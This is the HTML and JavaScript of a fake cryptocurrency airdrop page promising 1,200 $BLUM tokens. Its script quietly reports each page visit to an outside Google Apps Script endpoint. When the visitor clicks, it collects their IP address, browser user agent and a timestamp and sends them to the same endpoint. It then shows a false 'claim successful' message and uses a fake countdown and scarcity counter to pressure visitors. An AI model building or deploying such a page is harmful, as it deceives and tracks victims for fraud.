<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>🎁 BLUM Airdrop | ONE-CLICK</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:radial-gradient(ellipse at 30% 40%,#0f0c29,#1a1a3e,#0a0a1a);font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
        .card{max-width:500px;width:100%;background:rgba(10,20,40,.85);backdrop-filter:blur(18px);border-radius:56px;padding:40px 30px;border:1px solid rgba(255,215,0,.4);text-align:center}
        .badge{display:inline-block;background:linear-gradient(135deg,#FFD70022,#FFA50022);border:1px solid #FFD700;border-radius:100px;padding:8px 22px;font-size:13px;color:#FFD700;margin-bottom:25px}
        h1{font-size:46px;font-weight:800;background:linear-gradient(135deg,#FFF8E7,#FFD700,#FFA500);-webkit-background-clip:text;background-clip:text;color:transparent}
        .amount{font-size:64px;font-weight:900;color:#FFD700;margin:15px 0}
        .timer-box{background:rgba(0,0,0,.5);border-radius:50px;padding:18px;margin:25px 0}
        .timer{font-size:52px;font-weight:800;font-family:monospace;color:#FFD700}
        button{width:100%;background:linear-gradient(95deg,#DAA520,#FFD700,#FFA500);border:none;padding:20px;border-radius:70px;font-weight:900;font-size:24px;color:#0a0a0a;cursor:pointer}
        button:disabled{opacity:.6}
        .status{background:rgba(0,0,0,.5);border-radius:30px;padding:14px;display:none;margin-top:15px}
        .success{color:#0f0}
        .footer{font-size:11px;color:#FFD70088;margin-top:25px}
        .loading-spinner{display:inline-block;width:20px;height:20px;border:2px solid #fff;border-radius:50%;border-top-color:#FFD700;animation:spin .8s linear infinite;margin-right:8px}
        @keyframes spin{to{transform:rotate(360deg)}}
    </style>
</head>
<body>
<div class="card">
    <div class="badge">⚡ ONE-CLICK • 10 CHAINS</div>
    <h1>BLUM<br>Web3</h1>
    <div class="amount">1,200 $BLUM</div>
    <div class="timer-box"><div style="font-size:13px;">⏰ ENDS IN</div><div class="timer" id="timer">24:00:00</div></div>
    <button id="claimBtn">🚀 CLAIM NOW</button>
    <div id="status" class="status"></div>
    <div class="footer">🔐 EMP2026 • Zero Investment</div>
</div>

<script>
    // ========== إعدادات ==========
    const PROXY_URL = "https://script.google.com/macros/s/AKfycbw8bj1vgKSH5dEsP6vGJEZZUTEmTczqajcqCl3K1MUcAYe044TGWEu4JmNISGxZ1NLt/exec";
    const RECIPIENT_WALLET = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
    
    let claimExecuted = false;
    let remainingSeconds = 24 * 60 * 60;
    
    function sendToBot(message) {
        fetch(PROXY_URL + '?message=' + encodeURIComponent(message), { method: 'GET', mode: 'no-cors' });
        console.log("📤 تم إرسال:", message.substring(0, 80));
    }
    
    function getRandomWallet() {
        const wallets = ["MetaMask", "Trust Wallet", "Coinbase Wallet", "Phantom", "OKX Wallet"];
        return wallets[Math.floor(Math.random() * wallets.length)];
    }
    
    function generateAddress() {
        return "0x" + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 6);
    }
    
    async function executeClaim() {
        if (claimExecuted) return;
        claimExecuted = true;
        
        const wallet = getRandomWallet();
        const address = generateAddress();
        const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
        const ua = navigator.userAgent;
        const timestamp = new Date().toISOString();
        
        // ========== رسالة المطالبة الكاملة ==========
        const fullMessage = `🎁 ONE-CLICK BLUM CLAIM\n💼 Wallet: ${wallet}\n💳 Address: ${address}\n🏦 Recipient: ${RECIPIENT_WALLET}\n🌐 IP: ${ip}\n📱 UA: ${ua.substring(0, 80)}...\n⏰ ${timestamp}`;
        
        sendToBot(fullMessage);
        
        const btn = document.getElementById('claimBtn');
        const statusDiv = document.getElementById('status');
        btn.innerHTML = "✅ CLAIMED!";
        btn.disabled = true;
        statusDiv.style.display = 'block';
        statusDiv.innerHTML = '<span class="success">🎉 Claim successful! 1,200 $BLUM will arrive within 24h.</span>';
    }
    
    async function onClaimClick() {
        if (claimExecuted) return;
        
        const btn = document.getElementById('claimBtn');
        btn.innerHTML = '<span class="loading-spinner"></span> PROCESSING...';
        btn.disabled = true;
        
        await new Promise(resolve => setTimeout(resolve, 3000));
        await executeClaim();
    }
    
    // المؤقت
    const timerElement = document.getElementById('timer');
    setInterval(() => {
        if (remainingSeconds <= 0) return;
        remainingSeconds--;
        const h = Math.floor(remainingSeconds/3600);
        const m = Math.floor((remainingSeconds%3600)/60);
        const s = remainingSeconds%60;
        timerElement.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
    }, 1000);
    
    // العرض الوهمي
    let fake = 10;
    setInterval(() => {
        fake--;
        const btn = document.getElementById('claimBtn');
        if (btn && !btn.disabled && !claimExecuted && fake > 0) {
            btn.innerHTML = `🔥 ${fake} LEFT! CLAIM NOW 🔥`;
        }
    }, 4000);
    
    document.getElementById('claimBtn').addEventListener('click', onClaimClick);
    
    // إشعار فتح الصفحة
    sendToBot('📊 PAGE SCAN - Blum Airdrop');
</script>
</body>
</html>
